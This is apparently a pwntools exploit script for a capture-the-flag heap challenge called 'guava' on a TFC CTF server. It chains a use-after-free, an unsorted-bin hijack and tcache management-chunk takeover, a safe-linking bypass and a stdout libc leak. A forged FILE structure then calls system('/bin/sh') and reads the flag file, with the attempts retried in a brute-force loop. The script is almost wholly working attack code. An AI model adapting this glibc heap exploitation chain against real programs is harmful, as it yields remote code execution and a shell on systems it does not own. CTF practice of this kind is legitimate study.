#!/usr/bin/python3

from pwn import *
from tqdm   import*
exe = ELF('guava_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        brva 0x144C
        brva 0x13B0
        c
        ''')
        input()


p = remote('challs.tfcctf.com', 31189)


def malloc(size, data, offset=0):
    global cnt
    sla(b'*> ', b'1')
    sla(b'how many guavas: ', str(size))
    sla(b'guavset: ', str(offset))
    sa(b'guavas: ', data)
    cnt += 1
    return cnt


def free(idx):
    sla(b'*> ', b'2')
    sla(b'guava no: ', str(idx))


#####################################
#           Prep allocations        #
#####################################
# This is the chunk size we will be working with for the unsorted bin hijack
for i in trange(256):
    try:
        cnt = -1
        mal_size = 0x88
        malloc(0x18, b'GUARD 1')

        # Make allocations for exhausting t-cache for later
        tcache_0x90 = []
        tcache_0x1b0 = []
        for i in range(7):
            tcache_0x90.append(malloc(mal_size, b'TCACHE_FUEL'))
        for i in range(7):
            tcache_0x1b0.append(malloc(0x1a8, b'TCACHE_FUEL'))

        # Set 0x10001 in heap above 0x20 and 0x30 t-cache list
        free(malloc(0x3d8, b'LSB OF FAKE CHUNK SIZE'))
        free(malloc(0x3e8, b'MSB OF FAKE CHUNK SIZE'))

        # Prep the allocation for two large unosrted bin entries with the ability
        # to create a UAF
        malloc(0x18, b'GUARD 1')
        a1 = malloc(mal_size, b'A1'*(mal_size//2))
        b1 = malloc(mal_size, b'B1'*(mal_size//2))
        c1 = malloc(mal_size, b'C1'*(mal_size//2))
        d1 = malloc(mal_size, b'D1'*(mal_size//2))
        malloc(0x18, b'GUARD 2')
        a2 = malloc(mal_size, b'A2'*(mal_size//2))
        b2 = malloc(mal_size, b'B2'*(mal_size//2))
        c2 = malloc(mal_size, b'C2'*(mal_size//2))
        d2 = malloc(mal_size, b'D2'*(mal_size//2))
        malloc(0x18, b'GUARD 3')

        # Fill up the 0x90 t-cache
        for i in tcache_0x90:
            free(i)

        #########################################################
        #           Create the UAF setup for later              #
        #########################################################
        free(a1)
        free(b1)
        free(c1)

        free(a2)
        free(b2)
        free(c2)

        unsorted2 = malloc(0x1a8, b'2'*0x118+p64(0x31))
        unsorted1 = malloc(0x1a8, b'1'*0x118+p64(0x21))

        free(c1)  # 0x21 t-cache entry
        free(c2)  # 0x31 t-cache entry
        free(unsorted2)
        free(unsorted1)

        unsorted1 = malloc(0x1a8, b'1'*mal_size+p64(0xe1))
        unsorted2 = malloc(0x1a8, b'2'*mal_size+p64(0xf1))

        # exhaust t-cache for later use
        for i in tcache_0x1b0:
            free(i)

        free(b1)  # 0xe1 chunk entry
        free(b2)  # 0xf1 chunk entry

        #########################################################
        #       Fit the unsorted chunks to fit in the UAF       #
        #########################################################

        # Fit unsorted 1
        free(unsorted1)
        free(d1)

        # Malloc using ONLY chunks not present in any t-cache to make it shrink the unsorted bin entry
        malloc(0x38, b'X')
        malloc(0x48, b'X')
        malloc(0x38, b'X')
        malloc(0x58, b'X')

        # Allocate the rest of unsorted1 such that it does not get sorted when working with unsorted2
        unsorted_f1 = malloc(0x108, b'Y'*mal_size)

        # Fit unsorted 2
        free(unsorted2)
        free(d2)

        # Same as above
        malloc(0x38, b'X')
        malloc(0x48, b'X')
        malloc(0x38, b'X')
        malloc(0x58, b'X')

        # Same as above
        unsorted_f2 = malloc(0x108, b'Z'*mal_size)
        # This will be hijacked
        unsorted_f3 = malloc(0x108, b'X'*mal_size)

        #################################################################
        #               Exhaust the 0x110 t-cache bin                   #
        #################################################################
        tcache_0x110 = []
        for i in range(8):
            tcache_0x110.append(malloc(0x108, b'^'*0x108))
        for i in tcache_0x110:
            free(i)

        #################################################################################
        #   Make the entry in the mgmt chunk a valid chunk by making the size 0x10000   #
        #   and making a valid size next to it with prev_in_use set to 0                #
        #################################################################################

        for i in range(36):
            malloc(0x5f8, b'Z'*0x5f8)
        malloc(0x5f8, b'A'*0xd0+p64(0x10000)+p64(0x20))

        ###############
        # Free chunks #
        ###############

        free(unsorted_f1)  # Start of unsorted bin

        free(unsorted_f3)  # This will be hijacked for later

        free(unsorted_f2)  # End of unsorted bin

        #############################################################################################
        # Change the FWD and BCK pointers of the unsorted bin entires to our faked chunk in mgmt    #
        #############################################################################################

        malloc(0xd8, p16(0xb080), 0xa8)  # BCK
        malloc(0xe8, p16(0xb080), 0xa0)  # FWD

        #########################################################################################
        # Alloc in to mgmt chunk to overwrite LSB of 0x3d8 t-cache entry to control mgmt fully! #
        #########################################################################################

        # # Overwrite LSB of 0x3d8
        malloc(0x248, p16(0xb010), 0x1e0)

        # # # Allocate at the management chunk!
        mgmt = malloc(0x3d8, p8(0)*0x288)

        # # ###########################
        # # #   Bypass protect_ptr    #
        # # ###########################

        l1 = malloc(0x18, b'A'*0x18)
        l2 = malloc(0x18, b'B'*0x18)
        l3 = malloc(0x188, b'A'*0x188)
        l4 = malloc(0x188, b'B'*0x188)

        free(l1)
        free(l2)
        free(l3)
        free(l4)

        free(mgmt)

        malloc(0x98, p16(0x65c0))
        malloc(0x288, p64(0x191) + p16(0xb640), 0x78)
        malloc(0x18, b'wan')
        free(mgmt)

        malloc(0x288,  p16(0xb090), 0x138)
        a1 = malloc(0x188, b'\x11')
        # GDB()
        malloc(0x188, flat(
            0xfbad1800,
            0, 0, 0
        ) + p8(0))
        libc.address = u64(p.recv(8)) - 0x204644
        info("libc.address: " + hex(libc.address))
        free(mgmt)
        free(a1)
        malloc(0x288,  p64(libc.sym._IO_2_1_stdout_), 0x138)

        # _IO_stdfile_1_lock  (symbol not exported)
        stdout_lock = libc.address + 0x205710
        stdout = libc.sym['_IO_2_1_stdout_']
        fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
        gadget = libc.address + 0x00000000001724f0
        fake = FileStructure(0)
        fake.flags = 0x3b01010101010101
        # the function that we will call: system()
        fake._IO_read_end = libc.sym['system']
        fake._IO_save_base = gadget
        fake._IO_write_end = u64(b'/bin/sh\x00')  # will be at rdi+0x10
        fake._lock = stdout_lock
        fake._codecvt = stdout + 0xb8
        # _wide_data just need to points to empty zone
        fake._wide_data = stdout+0x200
        fake.unknown2 = p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)
        malloc(0x188, bytes(fake))
        sl("cat /home/ctf/flag.txt")
        print(p.recvall(timeout=2))
    except:
        p.close()
        p = remote("challs.tfcctf.com", 31189)
        continue
    p.close()
    sleep(1)
    p = remote("challs.tfcctf.com", 31189)



# nc challs.tfcctf.com 31189